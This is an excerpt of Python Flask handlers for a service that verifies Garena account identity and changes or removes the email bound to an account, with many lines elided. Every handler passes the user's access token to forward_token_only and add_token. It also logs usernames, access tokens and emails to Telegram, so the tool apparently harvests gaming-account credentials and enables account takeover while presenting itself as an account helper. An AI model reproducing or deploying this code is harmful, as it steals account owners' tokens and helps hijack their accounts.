...
def verify_identity():
    try:
        ...
        forward_token_only(access_token)
        add_token('verify_identity', username, access_token, email or 'N/A', 
        ...
        if not email:
            try:
                ...
                info_res = requests.get(info_url, params=info_payload, headers=GARENA_HEADERS, timeout=10)
        ...
        if identity_token:
            ...
            return jsonify({'success': False, 'error': 'OTP, Security code or Identity token required'}), 400
        ...
        if response.status_code == 200:
            try:
                new_identity_token = response.json().get('identity_token', '')
            except:
                pass
        
        if result['success']:
            log_to_telegram('IDENTITY_VERIFIED', username, access_token, email, '✅ Identity verified')
            add_log('identity_verified', username, f'Email: {email}')
        else:
            log_to_telegram('IDENTITY_VERIFY_FAILED', username, access_token, email, result.get('error', 'Failed'))
            add_log('identity_verify_failed', username, f'Email: {email} | Error: {result.get("error")}')
        
        return jsonify({
            'success': result['success'],
            'identity_token': new_identity_token,
            'data': result.get('data', {}),
            'raw': response.text
        })
        
    except Exception as e:
        log_to_telegram('VERIFY_IDENTITY_ERROR', session.get('user_id', 'Unknown'), 
                       data.get('access_token', '') if 'data' in locals() else '', 
                       data.get('email', '') if 'data' in locals() else '', str(e))
        return jsonify({'success': False, 'error': str(e)}), 500
...
def create_rebind():
    try:
        ...
        if not verifier_token:
            return jsonify({'success': False, 'error': 'Verifier token required'}), 400

        forward_token_only(access_token)
        add_token('create_rebind', username, access_token, email, f'Identity: {identity_token[:20]}...')
        ...
        verify_res = requests.post(verify_url, headers=GARENA_HEADERS, data=verify_data, timeout=15)
        verify_result = format_response_text(verify_res.text)
        
        if not verify_result['success']:
            return jsonify({'success': False, 'error': 'Identity verification failed'}), 400
        ...
        verify_otp_res = requests.post(verify_otp_url, headers=GARENA_HEADERS, data=verify_otp_data, timeout=15)
        verify_otp_result = format_response_text(verify_otp_res.text)
        
        if not verify_otp_result['success']:
            return jsonify({'success': False, 'error': 'New email verification failed'}), 400
        ...
        if result['success']:
            log_to_telegram('REBIND_CREATED', username, access_token, email, '✅ Email changed successfully!')
            add_log('rebind_created', username, f'New Email: {email}')
        else:
            log_to_telegram('REBIND_CREATE_FAILED', username, access_token, email, result.get('error', 'Unknown error'))
            add_log('rebind_create_failed', username, f'Email: {email} | Error: {result.get("error")}')
        ...
        log_to_telegram('CREATE_REBIND_ERROR', session.get('user_id', 'Unknown'), 
                       data.get('access_token') or data.get('token', '') if 'data' in locals() else '', 
                       data.get('email', '') if 'data' in locals() else '', str(e))
        return jsonify({'success': False, 'error': str(e)}), 500
...
def create_unbind():
    try:
        ...
        if result['success']:
            ...
            log_to_telegram('UNBIND_CREATE_FAILED', username, access_token, '', result.get('error', 'Unknown error'))
            add_log('unbind_create_failed', username, f'Error: {result.get("error")}')
        ...
        log_to_telegram('CREATE_UNBIND_ERROR', session.get('user_id', 'Unknown'), 
                       data.get('access_token') or data.get('token', '') if 'data' in locals() else '', '', str(e))
        return jsonify({'success': False, 'error': str(e)}), 500
